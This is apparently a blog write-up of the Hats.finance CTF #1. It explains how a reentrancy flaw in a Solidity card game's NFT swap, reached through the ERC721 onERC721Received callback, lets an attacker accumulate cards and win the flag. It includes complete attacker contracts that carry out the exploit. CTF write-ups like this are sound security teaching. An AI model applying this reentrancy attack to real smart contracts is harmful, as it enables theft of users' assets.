+++
author = "merkleplant"
title = "Solution to Hats.finance CTF #1"
date = "2022-05-16"
+++

[Hats.finance](https://hats.finance/) is a decentralized smart bug bounty marketplace that intends to regularly run CTF competitions.

This article provides a quick walkthrough of hats’ first challenge and the solution I came up with.
<!--more-->


## The Challenge

Provided was a `Game.sol` contract that encodes a card fighting game where the
goal is to obtain a flag by pitching your deck of cards (called _Mons_) against
the deck of the flag holder and win the fight. You can find the GitHub repo [here](https://github.com/hats-finance/games).

After joining the game, using `Games#join()`, a wallet receives their 3 _Mons_
as NFTs.

Initiating a fight happens through the `Games#fight()` function.
Two notable implementation details are:

- Even with the best deck of _Mons_ possible (every _Mon_ 9/9), an attacker
  would lose against the current flag holder because they also hold a deck of 9/9
  cards, and in case of a draw the current flag holder wins

- The winner of a fight is whoever holds more Mons after the fight:
   ```solidity
   // winner is the player with most Mons left
   if (balanceOf(attacker) > balanceOf(opponent)) {
       flagHolder = attacker;
   }
   ```


## The Idea

What if it would be possible to increase the number of _Mons_ held in one
wallet?

If a wallet would hold 7 _Mons_ it would win against the current flag holder.
3 _Mons_ would be burned from the attacker’s wallet during the fight, leaving
4 _Mons_ in the attacker’s wallet and 3 _Mons_ in the flag holder’s wallet
after the fight is over.
This leads to the attacker being selected as the winner.


## Finding a way to increase a wallet’s Mon balance

Going through the code trying to find a way to increase a wallet’s _Mon_
balance, the `Games#swap(address to, uint monId1, uint monId2)` function looks
promising.

It is the only public callable function that transfers _Mon_ NFTs between
wallets.

The _Mon_ cards are implemented as ERC721s, building upon the OpenZeppelin
library. The swap function transfers the NFTs using OpenZeppelin’s
`ERC721#_safeTransfer(address to, uint id)` function.


## Checking the deps

OpenZeppelin’s `ERC721#_safeTransfer/4` function looks like this ([link](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L203)):

```solidity
function _safeTransfer(
    address from,
    address to,
    uint256 tokenId,
    bytes memory data
) internal virtual {
    _transfer(from, to, tokenId);
    require(_checkOnERC721Received(from, to, tokenId, data), "ERC721: transfer to non ERC721Receiver implementer");
}
```

The function first transfers the NFT to the receiver address and afterwards
checks that the receiver is an `ERC721Receiver`.

What is an `ERC721Receiver`? What exactly does the `_checkOnERC721Received`
function do?

```solidity
function _checkOnERC721Received(
    address from,
    address to,
    uint256 tokenId,
    bytes memory data
) private returns (bool) {
    if (to.isContract()) {
        try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) {
            return retval == IERC721Receiver.onERC721Received.selector;
        } catch (bytes memory reason) {
            // Error handling omitted.
        }
    } else {
        return true;
    }
}
```

An `ERC721Receiver`, as implemented in the function, is:

- An EOA address
- A contract that returns ERC721’s `onERC721Received` function selector when
  called via the `onERC721Received/4` function


## Back to the Game

Quite literally, the winning move is going back to the game.

Let’s recap:

- Calling the `Games#fight()` function with a wallet holding 7 _Mons_ wins the
  game
- Transfer of NFTs between wallets is only possible through the `Games#swap/3`
  function
- Directly after a _Mon_ transfer, the receiver is called via the
  `ERC721#onERC721Received/4` function

The solution is to use the `ERC721#onERC721Received/4` callback to reenter the
game.


## Capture the Flag

A path to capture the flag would then be:

- Create a few fren wallets, each joining the game and holding 3 _Mons_
- Create an attacker contract and join the game
- Call the `Games#swap/3` function from a fren wallet to transfer a _Mon_ to
  the attacker wallet
- The attacker uses the ERC721 callback function, in which they hold 4 _Mons_,
  to let a fren wallet send them another _Mon_
- Repeat the last step until the attacker’s wallet holds at least 7 _Mons_
- If the attacker holds at least 7 _Mons_ while being called via
  `onERC721Received/4`, attack the flag holder via `Games#fight()`


## Implementing the PoC

We need two different contracts, the user fren contracts from which the
attacker borrows NFTs, and the attacker contract that reenters the game when
called via `onERC721Received/4`.

You can find the whole repo [here](https://github.com/pmerkleplant/Hats-Finance-Game-Solution).

Let’s start with the `User` contract:

```solidity
contract User {
    // The attacker's address.
    address private immutable solution;
    // The game's address.
    IGame private immutable game;
    // Our deck, i.e. our 3 Mon NFTs.
    uint[3] private deck;

    constructor(address game_) {
        solution = msg.sender;
        game = IGame(game_);
    }

    function joinGame() external {
        deck = game.join();
        require(
            game.balanceOf(address(this)) == 3,
            "User#joinGame: Joinig game failed"
        );
    }

    // Note that a Mon needs to be flagged as `upForSale` before a swap
    // can be initiated.
    function putUpForSale() external {
        game.putUpForSale(deck[0]);
        game.putUpForSale(deck[1]);
        game.putUpForSale(deck[2]);
    }

    // Swap an own Mon with some Mon from the attacker.
    // This function is called by the attacker.
    function attack(uint idx, uint wantId) external {
        game.swap(solution, deck[idx], wantId);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
```

The attacker will call the `attack()` function, initiating a swap from a Mon
from the user’s wallet to a _Mon_ from the attacker’s wallet.

Going further, let’s check out the attacker contract, called `Solution`:

```solidity
contract Solution {
    // The game's address.
    IGame private immutable game;
    // Our deck, i.e. our 3 Mon NFTs.
    uint[3] private deck;

    // The two fren contracts to borrow Mon NFTs from.
    User u1;
    User u2;

    constructor(address game_) {
        game = IGame(game_);

        // Join game, receive 3 NFTs.
        deck = game.join();
        require(
            game.balanceOf(address(this)) == 3,
            "Solution: Joinig game failed"
        );
    }

    // Function to start the attack.
    function captureFlag() external {
        // Put own NFT's for sale.
        game.putUpForSale(deck[0]);
        game.putUpForSale(deck[1]);
        game.putUpForSale(deck[2]);

        // Deploy 2 User frens.
        u1 = new User(address(game));
        u2 = new User(address(game));

        // Let user's join game.
        u1.joinGame();
        u2.joinGame();

        // Let user's NFTs put up for sale.
        u1.putUpForSale();
        u2.putUpForSale();

        // Start attack.
        u1.attack(0, 8);
    }

    // This function is being called during a swap we initiated with
    // a `<User>.attack()` call.
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        uint balance = game.balanceOf(address(this));

        // During the fight we will lose 3 NFTs. In order to still have a
        // higher balance than the current flagHolder, we need 7 NFTs.

        if (balance == 4) {
            // Continue with attack.
            u1.attack(1, 6);
        } else if (balance == 5) {
            // Continue with attack.
            u1.attack(2, 7);
        } else if (balance == 6) {
            // Continue with attack.
            u2.attack(0, 9);
        } else {
            // Initiate fight...
            game.fight();
            // ...and make sure we won.
            require(game.flagHolder() == address(this));
        }

        // Afterwards return the correct function selector to make OZ's
        // `_safeTransfer()` function pass.
        return IERC721Receiver.onERC721Received.selector;
    }
}
```

The function `captureTheFlag()` initiates the attack. It marks their own _Mon_
NFTs as `upForSale` and sets up the two `User` contracts.
Lastly, it starts the attack by starting a swap with a user’s wallet and the
attacker’s one.

The attacker contract will then be called back via the `onERC721Received/4`
function, in which a next swap is initiated as long as the Mon NFT balance is
less than seven.

If the _Mon_ NFT balance is sufficient, the `Gameefight()` function is called.

To make OZ’s `_safeTransfer/4` function pass after we won the game (remember,
all the NFT swaps are not yet fully executed), we return the expected function
selector.
